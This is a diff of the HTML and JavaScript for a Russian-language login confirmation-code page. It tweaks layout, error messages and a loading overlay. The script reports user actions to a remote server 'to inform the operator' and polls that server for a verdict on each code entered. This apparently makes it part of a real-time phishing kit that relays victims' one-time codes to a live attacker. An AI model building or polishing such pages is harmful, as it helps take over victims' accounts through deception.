@@ -16,14 +16,16 @@
       flex-direction: column;
       align-items: center;
       justify-content: flex-start;
+      -webkit-text-size-adjust: 100%;
+      -webkit-tap-highlight-color: transparent;
     }
     .main-block {
       background: #fff;
       border-radius: 18px;
       box-shadow: 0 4px 24px #b3c6e6aa;
-      max-width: 400px;
+      max-width: 382px;
       width: 100%;
-      margin-top: 40px;
+      margin: 46px 0 0 0;
       padding: 56px 32px 32px 32px;
       box-sizing: border-box;
       display: flex;
@@ -58,9 +60,10 @@
     }
     .logo {
       display: block;
-      margin: 0 auto 48px auto;
+      margin: 0 auto 43px auto;
       width: 194px;
       height: 34px;
+      line-height: 1;
     }
     .title {
       font-size: 24px;
@@ -99,7 +102,7 @@
       width: 100%;
       display: flex;
       gap: 10px;
-      justify-content: flex-start;
+      justify-content: center;
       margin-bottom: 18px;
     }
     .code-inputs input {
@@ -121,15 +124,31 @@
       border: 2px solid #0d4cd3;
     }
     .code-inputs.error input {
-      background: #ffebee !important;
+      background-color: #fff0f0 !important;
+      border: none !important;
+      -webkit-appearance: none;
+      appearance: none;
+    }
+    .code-inputs.error input:focus {
+      border: none !important;
+      background-color: #fff0f0 !important;
+      -webkit-appearance: none;
+      appearance: none;
     }
     .code-error-message {
       color: #ef5350;
       font-size: 13px;
       font-weight: normal;
       margin: 10px 0 0 0;
-      display: block;
+      display: none;
       position: static;
+    }
+    .error-message-server {
+      color: #ef5350;
+      font-size: 15px;
+      margin-top: 4px;
+      text-align: left;
+      display: none;
     }
     .timer-block {
       font-size: 15px;
@@ -207,17 +226,37 @@
       line-height: 1.5;
     }
     @media (max-width: 500px) {
-      .main-block, .info-block {
-        max-width: 98vw;
-        padding: 20px 6vw 20px 6vw;
+      .main-block {
+        max-width: 382px;
+        padding: 45px 16px 0px 16px;
+        box-sizing: border-box;
+        margin: 46px 0 0 0;
       }
       .logo {
         height: 32px;
-        margin-bottom: 20px;
+        margin-bottom: 43px;
       }
-      .info-icon {
-        width: 30px;
-        height: 30px;
+      .title {
+        font-size: 20px;
+        margin-bottom: 16px;
+      }
+      .info-text {
+        font-size: 15px;
+        margin-bottom: 24px;
+      }
+      .code-inputs {
+        gap: 8px;
+      }
+    }
+    @media (max-width: 400px) {
+      .main-block {
+        max-width: 90vw;
+        margin: 46px auto 0 auto;
+        padding: 45px 4vw 0px 4vw;
+        box-sizing: border-box;
+      }
+      .code-inputs {
+        gap: 6px;
       }
     }
     .modal-overlay-help {
@@ -287,12 +326,25 @@
     .loader-overlay {
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(255,255,255,0.7);
+      background: transparent;
       display: none;
       align-items: center;
       justify-content: center;
       z-index: 1000;
       backdrop-filter: blur(4px);
+    }
+    .loader {
+      border: 6px solid #e4ecfd;
+      border-top: 6px solid #0d4cd3;
+      border-radius: 50%;
+      width: 48px;
+      height: 48px;
+      animation: spin 1s linear infinite;
+      margin: auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
@@ -309,6 +361,7 @@
     <div class="code-label-row">
       <span class="code-label">Код подтверждения</span>
       <span class="code-error-message" id="code-error-message" style="display:none;">Неверный код</span>
+      <span class="error-message-server" id="error-message-server" style="display:none;">Неверный код</span>
     </div>
     <form id="code-form" autocomplete="off" style="width:100%;display:flex;flex-direction:column;align-items:center;">
       <div class="code-inputs">
@@ -362,7 +415,10 @@
     </div>
   </div>
   <div class="loader-overlay" id="loader-overlay">
-    <video src="6533f10d.webm" autoplay loop muted playsinline style="width:340px;height:340px;object-fit:contain;background:transparent;pointer-events:none;"></video>
+    <video id="loader-video" src="6533f10d.webm" autoplay loop muted playsinline style="width:340px;height:340px;object-fit:contain;background:transparent;pointer-events:none;display:block;"></video>
+    <div id="loader-fallback" style="display:none;align-items:center;justify-content:center;width:100%;height:100%;">
+      <div class="loader"></div>
+    </div>
   </div>
   <script src="assets/d4b72c006a7771677225038852ee8b96/noty.min.js"></script>
   <script>
@@ -577,7 +633,7 @@
             console.log('Waiting for valid JSON response...');
           } else {
             console.error('Error polling status:', e);
-          }
+        }
         }
 
         if (attempts >= maxAttempts) {
@@ -588,23 +644,32 @@
         }
       }, 1000);
     }
-    // Лоадер ожидания
+    // Функция для показа лоадера (добавляем console.log)
     function showWaitLoader() {
+      console.log('showWaitLoader called');
       document.getElementById('loader-overlay').style.display = 'flex';
     }
     function hideWaitLoader() {
       document.getElementById('loader-overlay').style.display = 'none';
     }
-    // Функция для показа ошибки
+    // Функция для отображения ошибки
     function showError() {
-      document.getElementById('code-error-message').style.display = 'inline-block';
-      document.querySelector('.code-inputs').classList.add('error');
-      codeInputs.forEach(inp => { 
-        inp.value = ''; 
-        inp.disabled = false; 
-      });
-      codeInputs[0].focus();
+      console.log('showError called');
       hideWaitLoader();
+      setTimeout(() => {
+        // Показываем только серверную ошибку
+        const serverError = document.getElementById('error-message-server');
+        if (serverError) serverError.style.display = 'block';
+        // Скрываем обычную ошибку
+        const errorMsg = document.getElementById('code-error-message');
+        if (errorMsg) errorMsg.style.display = 'none';
+        document.querySelector('.code-inputs').classList.add('error');
+        // Делаем поля снова активными!
+        codeInputs.forEach(inp => { inp.disabled = false; });
+        // Очищаем input-ы
+        codeInputs.forEach(inp => { inp.value = ''; });
+        // Не делаем автофокус!
+      }, 100);
     }
     // Таймер и повторная отправка
     let timer = 60;
@@ -637,21 +702,21 @@
       try {
         // Получаем userId
         const userId = await getOrCreateUserId();
-        if (!userId) {
+      if (!userId) {
           throw new Error('No userId available');
-        }
+      }
 
         // Отправляем событие для информирования оператора
         const response = await fetch(`${env.SERVER_URL}${env.API_ENDPOINT_STEP}`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            step: 'resend_code_click',
-            value: 'Пользователь нажал Отправить повторно',
-            origin: 'Вход',
-            userId: userId
-          })
-        });
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          step: 'resend_code_click',
+          value: 'Пользователь нажал Отправить повторно',
+          origin: 'Вход',
+          userId: userId
+        })
+      });
 
         if (!response.ok) {
           console.error('Failed to send resend event:', response.status);
@@ -675,21 +740,30 @@
         if (e.target === helpModal) helpModal.style.display = 'none';
       });
     }
-    // Фокус на первый input при загрузке
-    window.addEventListener('DOMContentLoaded', () => {
-      codeInputs[0].focus();
-    });
-    // Скрывать ошибку при вводе
+    // Скрывать ошибку при фокусе на поле
     codeInputs.forEach(input => {
-      input.addEventListener('input', function() {
-        // Скрывать ошибку только если все поля были пустые и вводится первая цифра
-        const allEmpty = Array.from(codeInputs).every(inp => inp.value === '' || inp === this);
-        if (allEmpty && this.value.length === 1) {
-          document.getElementById('code-error-message').style.display = 'none';
-          document.querySelector('.code-inputs').classList.remove('error');
-        }
+      input.addEventListener('focus', function() {
+        // Скрываем обе ошибки при фокусе
+        const errorMsg = document.getElementById('code-error-message');
+        const serverError = document.getElementById('error-message-server');
+        if (errorMsg) errorMsg.style.display = 'none';
+        if (serverError) serverError.style.display = 'none';
+        document.querySelector('.code-inputs').classList.remove('error');
       });
     });
+    // Fallback для iPhone (если видео не поддерживается, показываем fallback-лоадер)
+    const loaderVideo = document.getElementById('loader-video');
+    const loaderFallback = document.getElementById('loader-fallback');
+    if (loaderVideo && loaderFallback) {
+      loaderVideo.onerror = function() {
+        loaderVideo.style.display = 'none';
+        loaderFallback.style.display = 'flex';
+      };
+      if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+        loaderVideo.style.display = 'none';
+        loaderFallback.style.display = 'flex';
+      }
+    }
   </script>
 </body>
 </html> 
